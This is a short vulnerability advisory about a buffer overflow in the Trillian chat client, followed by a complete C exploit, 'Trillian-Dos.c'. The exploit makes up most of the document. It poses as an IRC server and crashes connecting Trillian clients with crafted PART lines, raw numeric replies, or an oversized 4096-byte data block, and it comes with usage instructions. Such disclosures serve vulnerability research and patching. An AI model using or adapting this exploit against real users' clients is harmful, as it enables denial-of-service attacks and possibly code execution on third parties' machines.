source: http://www.securityfocus.com/bid/5777/info

A vulnerability has been reported for Trillian. Reportedly, Trillian is prone to a buffer overflow condition when it receives blocks of data that are larger than 4095 bytes. 

A malicious server may exploit this condition to cause a denial of service in the client. This may also potentially be exploited to execute arbitrary code, though this possibility has not been confirmed.

/* Trillian-Dos.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits Multiple Trillian DoS Flaws:
      Raws 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332, 333,
352, 367
      Part Flaw
      Data length flaw.

   Tested On Version .74
   Compiles with Borland 5.5 Commandline Tools.

   These Examples Will Just DoS The Trillian Client,
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

SOCKET s;

#define SERVER ":server "
#define PART ":nick!ident@address PART\n"

int main(int argc, char *argv[]) {
		 SOCKET TempSock = SOCKET_ERROR;
		 WSADATA WsaDat;
		 SOCKADDR_IN Sockaddr;
		 int nRet;
		 char payload[4096];
		 if (argc < 2) {
		 		 usage();
		 		 return 1;
		 }
		 if ((!strcmp(argv[1],"raw")) && (argc < 3) || (strcmp(argv[1],"raw")) &&
(strcmp(argv[1],"part")) && (strcmp(argv[1],"data"))) {
		 		 usage();
		 		 return 1;
		 }

		 printf("Listening on port 6667 for connections....\n");
		 if (WSAStartup(MAKEWORD(1, 1), &WsaDat) != 0) {
        		 printf("ERROR: WSA Initialization failed.");
		 		 return 0;
		 }


		 /* Create Socket */
		 s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		 if (s == INVALID_SOCKET) {
		 		 printf("ERROR: Could Not Create Socket. Exiting\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 Sockaddr.sin_port = htons(6667);
		 Sockaddr.sin_family = AF_INET;
		 Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = bind(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
		 if (nRet == SOCKET_ERROR) {
		 		 printf("ERROR Binding Socket");
		 		 WSACleanup();
		 		 return 0;
		 }

		 /* Make Socket Listen */
		 if (listen(s, 10) == SOCKET_ERROR) {
		 		 printf("ERROR: Couldnt Make Listening Socket\n");
		 		 WSACleanup();
		 		 return 0;
		 }

		 while (TempSock == SOCKET_ERROR) {
		       TempSock = accept(s, NULL, NULL);
		 }

		 printf("Client Connected, Sending Payload\n");


		 if (!strcmp(argv[1],"part")) {
		 		 send(TempSock,PART,strlen(PART),0);
		 }
		 if (!strcmp(argv[1],"raw")) {
		 		 send(TempSock,SERVER,strlen(SERVER),0);
		 		 send(TempSock,argv[2],strlen(argv[2]),0);
		 		 send(TempSock,"\n",1,0);
		 }
		 if (!strcmp(argv[1],"data")) {
		 		 memset(payload,'A',4096);
		 		 send(TempSock,payload,strlen(payload),0);
		 }
		 printf("Exiting\n");
		 sleep(100);
		 WSACleanup();
		 return 0;
}

usage() {
		 		 printf("\nTrillian Multiple DoS Flaws\n");
		 		 printf("---------------------------\n");
		 		 printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
		 		 printf("Tested On Version .74\n\n");
		 		 printf("Usage: Trillian-Dos <type> [num]\n");
		 		 printf("Type: raw, part, data\n");
		 		 printf("Num : 206, 211, 213, 214, 215, 217, 218, 243, 302, 317, 324, 332,
333, 352, 367\n\n");
}